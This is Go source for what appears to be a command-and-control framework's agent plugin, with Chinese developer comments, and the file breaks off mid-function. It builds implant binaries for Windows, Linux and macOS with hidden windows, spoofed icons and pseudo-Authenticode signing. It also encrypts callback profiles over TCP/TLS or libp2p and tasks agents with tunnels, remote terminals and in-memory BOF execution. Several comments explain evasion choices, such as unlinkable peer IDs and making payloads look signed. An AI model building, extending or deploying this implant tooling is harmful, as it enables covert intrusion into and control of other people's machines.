package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	mrand "math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Adaptix-Framework/axc2"
	"github.com/google/shlex"
	"github.com/vmihailenco/msgpack/v5"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)

	// ★ 批次9d：与上面同名方法配对 —— 见调用点（COMMAND_TUNNEL_ACCEPT）的说明。
	//   ★ InitPlugin 是 `Ts = ts.(Teamserver)` 的**运行时**断言：core 必须真有这两个
	//     方法，否则插件加载即 panic。已核对 core/server/ts_tunnels.go 新增
	//     TsTunnelConnectionAcceptDirect(tunnelId, channelId int)，以及既有的
	//     TsTunnelChannelExists(channelId int) bool（签名逐字一致）。
	TsTunnelConnectionAcceptDirect(tunnelId int, channelId int)
	TsTunnelChannelExists(channelId int) bool

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

// maxBofObjectBytes 是单个 BOF 对象的上限，一条**读文件前**的守卫：
// 实参可能是敲错的路径（"/var/log/syslog"），没有上限就会把整个文件读进内存
// 再塞进任务包 —— 服务端 1.9G，这类手误不该有放大器。
const maxBofObjectBytes = 16 << 20 // 16 MiB

// resolveBofObject 把 `execute bof` 的实参解析成对象字节。
//
// ★ 为什么必须先试路径：本命令在命令树里的示例一直是
//   `execute bof /home/user/whoami.o`（ax_config.axs），WebUI 的补全也按
//   服务端绝对路径给候选，而这里原本**只认 base64** —— 操作员从候选里选一个，
//   得到 `illegal base64 data at input byte 4`，完全看不出「其实要贴 base64」。
//   linux_agent 早已是「先路径、后 base64」，这里补齐，四个 extender 行为一致。
//
// ★ 路径按**进程 cwd** 解析（服务端 cwd = <dist>，如 /home/ad/dist），
//   所以补全给的是绝对路径；相对路径能用只是巧合，不要依赖。
func resolveBofObject(v string) ([]byte, error) {
	if v == "" {
		return nil, errors.New("bof object is empty")
	}

	if st, statErr := os.Stat(v); statErr == nil && !st.IsDir() {
		if st.Size() > maxBofObjectBytes {
			return nil, fmt.Errorf("bof object %s is too large (%d bytes, max %d)", v, st.Size(), maxBofObjectBytes)
		}
		b, readErr := os.ReadFile(v)
		if readErr != nil {
			return nil, fmt.Errorf("cannot read bof object %s: %v", v, readErr)
		}
		if len(b) == 0 {
			return nil, fmt.Errorf("bof object %s is empty", v)
		}
		return b, nil
	}

	b, err := base64.StdEncoding.DecodeString(v)
	if err != nil {
		return nil, fmt.Errorf("bof object %q is neither a readable file on the teamserver nor valid base64 data", v)
	}
	if len(b) == 0 {
		return nil, fmt.Errorf("bof object %q decoded to 0 bytes", v)
	}
	return b, nil
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	addr := fmt.Sprintf("%s:%d", address, port)
	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	/// START CODE HERE
	/// END CODE HERE
	return makeProxyTask(data)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	/// START CODE HERE
	/// END CODE HERE
	return makeProxyTask(data)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTunnelStop{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	// ★ 批次9：原实现是**空壳** —— packData 从不赋值，makeProxyTask(nil) 下发的是一枚
	//   空任务，agent 收到什么也不做。这就是「API ok / GUI 看似成功 / 零流量」的第一因。
	//   写法沿用本文件自己的惯用法（msgpack 包 Command），**不照抄 beacon 的 packer 数组** ——
	//   gopher 的 agent 解析的是 Command{Code, Id, Data}，两套编码不通用。
	packerData, _ := msgpack.Marshal(ParamsTunnelReverse{TunnelId: tunnelId, Port: port})
	cmd := Command{Code: COMMAND_TUNNEL_REVERSE, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelPause{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_PAUSE, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	packerData, _ := msgpack.Marshal(ParamsTunnelResume{ChannelId: channelId})
	cmd := Command{Code: COMMAND_TUNNEL_RESUME, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	return makeProxyTask(data)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	packerData, _ := msgpack.Marshal(ParamsTerminalStop{TermId: terminalId})
	cmd := Command{Code: COMMAND_TERMINAL_STOP, Data: packerData}
	packData, _ = msgpack.Marshal(cmd)
	/// END CODE HERE
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os               string `json:"os"`
	Arch             string `json:"arch"`
	Format           string `json:"format"`
	Win7support      bool   `json:"win7_support"`
	ReconnectTimeout string `json:"reconn_timeout"`
	ReconnectCount   int    `json:"reconn_count"`
	// Windows EXE only (same JSON keys as Beacon agent UI):
	IconContent   string `json:"icon_content"`
	IconRandom    bool   `json:"icon_random"`
	ExePseudoSign bool   `json:"exe_pseudo_sign"`
}

var SrcPath = "src_gopher"

func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var agentProfiles [][]byte

	for _, transportProfile := range profile.ListenerProfiles {

		var listenerMap map[string]any
		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
			return nil, err
		}

		/// START CODE HERE

		var (
			generateConfig GenerateConfig
			profileData    []byte
		)

		err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
		if err != nil {
			return nil, err
		}

		agentWatermark, err := strconv.ParseInt(AgentWatermark, 16, 64)
		if err != nil {
			return nil, err
		}

		encrypt_key, ok := listenerMap["encrypt_key"].(string)
		if !ok || encrypt_key == "" {
			return nil, errors.New("listener profile: encrypt_key is required")
		}
		encryptKey, err := hex.DecodeString(encrypt_key)
		if err != nil {
			return nil, err
		}
		if len(encryptKey) != 16 {
			return nil, errors.New("encrypt_key must be 32 hex characters (16 bytes)")
		}

		reconnectTimeout, err := parseDurationToSeconds(generateConfig.ReconnectTimeout)
		if err != nil {
			return nil, err
		}

		protocol, _ := listenerMap["protocol"].(string)
		switch protocol {

		case "tcp":

			tcp_banner, _ := listenerMap["tcp_banner"].(string)

			servers, ok := listenerMap["callback_addresses"].(string)
			if !ok {
				return nil, errors.New("tcp profile: callback_addresses must be a string")
			}

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			var addresses []string
			for _, a := range strings.Split(servers, ",") {
				a = strings.TrimSpace(a)
				if a != "" {
					addresses = append(addresses, a)
				}
			}
			if len(addresses) == 0 {
				return nil, errors.New("tcp profile: need at least one callback address")
			}

			var sslKey []byte
			var sslCert []byte
			var caCert []byte
			Ssl, _ := listenerMap["ssl"].(bool)
			if Ssl {
				ssl_key, _ := listenerMap["client_key"].(string)
				sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
				if err != nil {
					return nil, err
				}

				ssl_cert, _ := listenerMap["client_cert"].(string)
				sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
				if err != nil {
					return nil, err
				}

				ca_cert, _ := listenerMap["ca_cert"].(string)
				caCert, err = base64.StdEncoding.DecodeString(ca_cert)
				if err != nil {
					return nil, err
				}
			}

			profile := Profile{
				Type:        uint(agentWatermark),
				Addresses:   addresses,
				BannerSize:  len(tcp_banner),
				ConnTimeout: reconnectTimeout,
				ConnCount:   generateConfig.ReconnectCount,
				UseSSL:      Ssl,
				SslCert:     sslCert,
				SslKey:      sslKey,
				CaCert:      caCert,
			}
			profileData, err = msgpack.Marshal(profile)
			if err != nil {
				return nil, err
			}

		case "libp2p":

			// Phase5 §4 步骤 7。地址语义与 tcp 分支共用 callback_addresses
			// （此处是 multiaddr，不是 host:port），但**不套 TLS** —— Noise 已提供
			// 加密与对端认证，再叠一层只会增加握手延迟与签名面。
			servers, ok := listenerMap["callback_addresses"].(string)
			if !ok {
				return nil, errors.New("libp2p profile: callback_addresses must be a string")
			}

			servers = strings.ReplaceAll(servers, " ", "")
			servers = strings.ReplaceAll(servers, "\n", ",")
			servers = strings.TrimSuffix(servers, ",")
			var addrs []string
			for _, a := range strings.Split(servers, ",") {
				a = strings.TrimSpace(a)
				if a != "" {
					addrs = append(addrs, a)
				}
			}

			// 可选 l2p_addrs：显式多地址列表（给了就**覆盖** callback_addresses）。
			if extra, ok := listenerMap["l2p_addrs"].(string); ok && strings.TrimSpace(extra) != "" {
				var fromExtra []string
				for _, a := range strings.FieldsFunc(extra, func(r rune) bool {
					return r == ',' || r == '\n' || r == ' ' || r == '\t'
				}) {
					if a = strings.TrimSpace(a); a != "" {
						fromExtra = append(fromExtra, a)
					}
				}
				if len(fromExtra) > 0 {
					addrs = fromExtra
				}
			}
			if len(addrs) == 0 {
				return nil, errors.New("libp2p profile: need at least one multiaddr")
			}

			l2pPeerID, _ := listenerMap["l2p_peer_id"].(string)
			l2pProtocol, _ := listenerMap["l2p_protocol"].(string)
			// ★ S6：l2p_peer_id 原是**死字段**（写进 agent profile 却从不被读，
			//   现已从 Profile 里删掉）。这里把它转成一条真判据：listener 自报的
			//   peer id 必须出现在它给出的**每一个** multiaddr 里 —— 不一致时
			//   agent 会去拨一个错误的 peer id，libp2p 在 Noise 握手阶段拒绝，
			//   现象是"agent 永远不上线"，与网络不通完全无法区分。
			if l2pPeerID != "" {
				for _, a := range addrs {
					if !strings.Contains(a, "/p2p/"+l2pPeerID) {
						return nil, fmt.Errorf("libp2p profile: l2p_peer_id %q not present in multiaddr %q", l2pPeerID, a)
					}
				}
			}
			l2pTimeout := 0
			if v, ok := listenerMap["l2p_dial_timeout"].(float64); ok && v > 0 {
				l2pTimeout = int(v)
			}
			// ★★ 绝不把 listener 的 l2p_privkey 当作 agent 自己的身份 —— Phase5
			// 实测出的第三个致命缺陷（红绿对照见 patches/l2p_ident.py 的文件头）：
			// listener 的私钥一旦被 agent 采用，agent 的 peer id 就等于它要拨的地址里
			// /p2p/<peerID> 那个 id ⇒ libp2p 的 swarm_dial.go:246
			//     if p == s.local { return nil, ErrDialToSelf }
			// 在任何传输层动作**之前**就返回 ⇒ agent 静默重试 5 次后退出（退出码 0、
			// 零输出），服务端连一次 SYN 都收不到。而且私钥会随**每一个**生成出来的
			// agent 二进制外泄 —— 拿到任意一个 agent 就能冒充 listener。
			// agent 是**拨号方**，用 libp2p 自生成的临时身份即可（见
			// src_gopher/transport_libp2p.go 的同名说明）；临时身份对隐匿性反而更好：
			// 每次运行的 peer id 都不同，不可跨运行关联。
			var l2pPrivKey []byte // 恒为 nil

			profile := Profile{
				Type:              uint(agentWatermark),
				Addresses:         addrs,
				ConnTimeout:       reconnectTimeout,
				ConnCount:         generateConfig.ReconnectCount,
				UseSSL:            false,
				Transport:         "libp2p",
				Libp2pAddrs:       addrs,
				Libp2pPrivKey:     l2pPrivKey,
				Libp2pProtocol:    l2pProtocol,
				Libp2pDialTimeout: l2pTimeout,
			}
			profileData, err = msgpack.Marshal(profile)
			if err != nil {
				return nil, err
			}

		default:
			return nil, errors.New("protocol unknown")
		}

		extHandler := ExtenderAgent{}
		profileData, err = extHandler.Encrypt(profileData, encryptKey)
		if err != nil {
			return nil, err
		}
		profileData = append(encryptKey, profileData...)

		profileString := ""
		for _, b := range profileData {
			profileString += fmt.Sprintf("\\x%02x", b)
		}
		agentProfiles = append(agentProfiles, []byte(profileString))

		/// END CODE HERE
	}
	return agentProfiles, nil
}

// agentNeedsLibp2p 判断这次构建是否需要 `-tags libp2p`（Phase5 §4 步骤 7）。
//
// ★ 判据必须与 GenerateProfiles 看**同一个来源**（profile.ListenerProfiles），
// 而不是包级变量 —— teamserver 可以并发构建，包级变量会让"A 构建的 tag 泄漏到 B"。
// ★ 与 GenerateProfiles 里的 switch **故意不共用函数**：这里只做"有没有 libp2p"
// 这一件事，不解析 profile 内容；解析失败当"不需要"处理，真正的错误留给
// GenerateProfiles 去报，避免同一个错误在两处各报一遍。
// （↑ 续行**不缩进**：Go 1.19+ 会把 doc comment 里缩进的续行当成代码块重排成 `//	`。）
func agentNeedsLibp2p(profile adaptix.BuildProfile) bool {
	for _, lp := range profile.ListenerProfiles {
		var lm map[string]any
		if err := json.Unmarshal(lp.Profile, &lm); err != nil {
			continue
		}
		if proto, _ := lm["protocol"].(string); proto == "libp2p" {
			return true
		}
	}
	return false
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		Filename string
		Payload  []byte
	)

	/// START CODE HERE

	var (
		generateConfig GenerateConfig
		GoArch         string
		GoOs           string
		buildPath      string
	)

	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
	if err != nil {
		return nil, "", err
	}

	currentDir := ModuleDir
	tempDir, err := os.MkdirTemp("", "ax-*")
	if err != nil {
		return nil, "", err
	}

	if generateConfig.Arch == "arm64" {
		GoArch = "arm64"
	} else if generateConfig.Arch == "amd64" {
		GoArch = "amd64"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("unknown architecture")
	}

	LdFlags := "-s -w"
	if generateConfig.Os == "linux" {
		Filename = "agent.bin"
		GoOs = "linux"
	} else if generateConfig.Os == "macos" {
		Filename = "agent.bin"
		GoOs = "darwin"
	} else if generateConfig.Os == "windows" {
		Filename = "agent.exe"
		GoOs = "windows"
		LdFlags += " -H=windowsgui"
	} else {
		_ = os.RemoveAll(tempDir)
		return nil, "", errors.New("operating system not supported")
	}
	buildPath = tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s/%s, Output: %s", GoOs, GoArch, Filename))

	sysoPath := filepath.Join(currentDir, SrcPath, "gopher_winres.syso")
	needSysoCleanup := false
	defer func() {
		if needSysoCleanup {
			_ = os.Remove(sysoPath)
		}
	}()

	if GoOs == "windows" {
		var iconData []byte
		if generateConfig.IconRandom {
			var errIcon error
			iconData, errIcon = generateRandomICO()
			if errIcon != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", fmt.Errorf("random icon: %w", errIcon)
			}
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Gopher: using random ICO (rsrc)")
		} else if strings.TrimSpace(generateConfig.IconContent) != "" {
			dec, errDec := base64.StdEncoding.DecodeString(strings.TrimSpace(generateConfig.IconContent))
			if errDec != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", errors.New("invalid icon base64")
			}
			if err := validateICOFile(dec); err != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", err
			}
			iconData = dec
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Gopher: embedding custom ICO (rsrc)")
		}
		if len(iconData) > 0 {
			if _, err := exec.LookPath("rsrc"); err != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", errors.New("Windows icon requires 'rsrc' on teamserver PATH (go install github.com/akavel/rsrc@latest)")
			}
			icoPath := filepath.Join(tempDir, "gopher_icon.ico")
			if err := os.WriteFile(icoPath, iconData, 0600); err != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", err
			}
			rsrcArch := "amd64"
			if GoArch == "arm64" {
				rsrcArch = "arm64"
			}
			cmdR := exec.Command("rsrc", "-ico", icoPath, "-arch", rsrcArch, "-o", sysoPath)
			cmdR.Dir = currentDir
			if out, errR := cmdR.CombinedOutput(); errR != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", fmt.Errorf("rsrc: %w\n%s", errR, string(out))
			}
			needSysoCleanup = true
		}
	}

	config := "package main\n\nvar encProfiles = [][]byte{\n"
	for _, profile := range agentProfiles {
		config += fmt.Sprintf("    []byte(\"%s\"),\n", profile)
	}
	config += "}\n"

	configPath := currentDir + "/" + SrcPath + "/config.go"
	err = os.WriteFile(configPath, []byte(config), 0644)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
	if generateConfig.Os == "windows" && generateConfig.Win7support {
		_, err := os.Stat("/usr/lib/go-win7/go")
		if os.IsNotExist(err) {
			return nil, "", errors.New("go-win7 not installed")
		}
		if _, err := os.Stat("/usr/lib/go-win7/pkg/include/textflag.h"); os.IsNotExist(err) {
			return nil, "", errors.New("go-win7 missing asm headers (pkg/include/textflag.h). Clone-only trees need headers from official Go: run `sudo bash scripts/repair_go_win7.sh` or re-run pre_install_linux_all.sh server")
		}
		cmdBuild = fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s GOROOT=/usr/lib/go-win7/ /usr/lib/go-win7/go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Using go-win7 for Windows 7 support")

	}
	// Phase5 §4 步骤 7：任一 listener profile 要 libp2p ⇒ 本产物必须带 tag 构建，
	// 否则编进去的是 transport_nolibp2p.go 的替身，agent 拨号必失败。
	// ★ 注入点**必须**在 Win7 分支**之后**：那个分支会把 cmdBuild 整个重写。
	if agentNeedsLibp2p(profile) {
		cmdBuild += " -tags libp2p"
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Gopher: libp2p transport requested -> adding -tags libp2p")
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")

	var buildArgs []string
	buildArgs = append(buildArgs, "-c", cmdBuild)
	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir+"/"+SrcPath, "sh", buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	// ★★ B-B1 硬门：**证明**这次产物里真的编进了它需要的 transport，而不是只相信
	//    agentNeedsLibp2p 的判断。判据是**双向**的 —— 正样本（本变体的指纹必须出现）
	//    + 负样本（另一种变体的指纹必须不出现）。只做负样本的话，"扫描通道在这个文件
	//    上根本没生效"也会通过，那正是归档里第⑨种假绿（负向观测必须先证明观测通道
	//    对该对象有效）。
	//    ★ 在这里拦下来，operator 看到的是**构建失败**并带原因，而不是一个永远不上线、
	//      且与"网络不通"无法区分的 agent。
	if err := axVerifyTransportTag(buildPath, agentNeedsLibp2p(profile)); err != nil {
		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_ERROR, "Gopher: "+err.Error())
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Gopher: transport tag assertion OK")

	finalExe := buildPath
	if GoOs == "windows" && generateConfig.ExePseudoSign {
		// ★ 工具没装时**降级为不签名并继续**，不再让整个生成失败。
		//   实测症状：控制台「生成载荷」页选 Gopher + 格式 EXE，点「生成并下载」后按钮
		//   下方直接红字 `pseudo-sign requires osslsigncode in PATH` —— 而伪签名只是让
		//   产物"看起来有签名"的美化步骤，缺一个可选工具就让 Windows EXE 完全生成不出来，
		//   代价明显不成比例（EXE 是最常用的格式）。
		//   与 beacon_agent 同型改动；那边上方 pe_header_mod.py 缺失也是这么处理的
		//   （"skipping PE post-processing"）。
		//   ★ 注意只对「工具缺失」降级：真正的签名**执行失败**仍然终止 —— 那时可能已经
		//     写出了半份产物，不能当成成功。
		if miss := pseudoSignMissingTool(); miss != "" {
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
				fmt.Sprintf("Gopher: pseudo-sign skipped: %s not in teamserver PATH — payload will be UNSIGNED (install it: pre_install_linux_all.sh server)", miss))
		} else {
			signedPath := filepath.Join(tempDir, "agent_signed.exe")
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Gopher: applying pseudo Authenticode (openssl + osslsigncode)...")
			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir); err != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", err
			}
			finalExe = signedPath
		}
	}

	Payload, err = os.ReadFile(finalExe)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	/// END CODE HERE

	return Payload, Filename, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(beat, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.ACP = int(sessionInfo.Acp)
	agentData.OemCP = int(sessionInfo.Oem)
	agentData.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agentData.Tid = ""
	agentData.Arch = "x64"
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr

	if sessionInfo.Os == "linux" {
		agentData.Os = adaptix.OS_LINUX
		agentData.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "windows" {
		agentData.Os = adaptix.OS_WINDOWS
		agentData.OsDesc = sessionInfo.OSVersion
	} else if sessionInfo.Os == "darwin" {
		agentData.Os = adaptix.OS_MAC
		agentData.OsDesc = sessionInfo.OSVersion
	} else {
		agentData.Os = adaptix.OS_UNKNOWN
		return agentData, nil, errors.New("unknown OS")
	}

	salt := sessionInfo.TransportSalt
	if len(salt) != 16 {
		salt = make([]byte, 16)
	}
	if len(sessionInfo.EncryptKey) != 16 {
		return agentData, nil, errors.New("invalid gopher session encrypt key length")
	}
	agentData.SessionKey = append(append([]byte(nil), sessionInfo.EncryptKey...), salt...)
	agentData.Domain = ""
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process

	/// END CODE

	return agentData, &ExtenderAgent{}, nil
}

/// AGENT HANDLER

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return GopherSessionEncrypt(data, key)
	/// END CODE
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	return GopherSessionDecrypt(data, key)
	/// END CODE
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {

	var packData []byte

	/// START CODE HERE

	var objects [][]byte
	var command Command

	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	/// END CODE

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	/// START CODE HERE

	err = errors.New("Function Pivot not packed")

	/// END CODE

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
